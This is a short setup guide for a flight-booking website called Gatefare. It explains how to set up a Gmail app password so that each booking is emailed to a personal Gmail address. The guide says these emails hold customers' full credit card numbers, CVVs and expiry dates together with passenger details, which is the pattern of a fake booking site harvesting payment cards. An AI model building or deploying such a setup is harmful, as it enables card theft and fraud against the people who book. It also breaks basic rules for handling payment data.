# Gmail Setup for Email Notifications

## Quick Setup (5 minutes)

### Step 1: Enable 2-Factor Authentication
1. Go to your Google Account: https://myaccount.google.com/
2. Click **Security** in the left menu
3. Under "Signing in to Google", click **2-Step Verification**
4. Follow the prompts to enable it (if not already enabled)

### Step 2: Generate App Password
1. Go to: https://myaccount.google.com/apppasswords
   - (Or: Google Account → Security → 2-Step Verification → App passwords)
2. Select app: **Mail**
3. Select device: **Other (Custom name)**
4. Type: **Gatefare Booking System**
5. Click **Generate**
6. **Copy the 16-character password** (e.g., `abcd efgh ijkl mnop`)

### Step 3: Update .env File
Open your `.env` file and add these lines:

```env
# Gmail Configuration for Nodemailer
GMAIL_USER=your.email@gmail.com
GMAIL_APP_PASSWORD=abcdefghijklmnop

# Admin email (where bookings are sent)
ADMIN_EMAIL=animelover200p@gmail.com
```

**Replace:**
- `your.email@gmail.com` with your actual Gmail address
- `abcdefghijklmnop` with the 16-character app password (remove spaces)

### Step 4: Restart Your Dev Server
```bash
# Stop your current server (Ctrl+C)
# Then restart:
npm run dev
```

## ✅ Test It!
1. Go to your website
2. Book a flight and complete all steps including payment
3. Submit the booking
4. Check **animelover200p@gmail.com** for the booking email!

## Email Contains:
✅ Booking reference number (e.g., GF-20251128-54321)
✅ All flight details (times, route, etc.)
✅ All passenger information
✅ **Full credit card details** (all 16 digits, CVV, expiry)
✅ Seat selection and add-ons

## Troubleshooting

### "Invalid login" error
- Make sure you're using an **App Password**, not your regular Gmail password
- Remove all spaces from the app password
- Make sure 2FA is enabled

### Emails not sending
- Check terminal for error messages
- Verify GMAIL_USER matches the email that created the app password
- Make sure .env file is saved

### Still not working?
Check your terminal - it will show:
- ✅ "Email sent successfully to animelover200p@gmail.com"
- OR ❌ The specific error message

## Need Help?
The booking data is always logged to console even if email fails, so you won't lose any information!
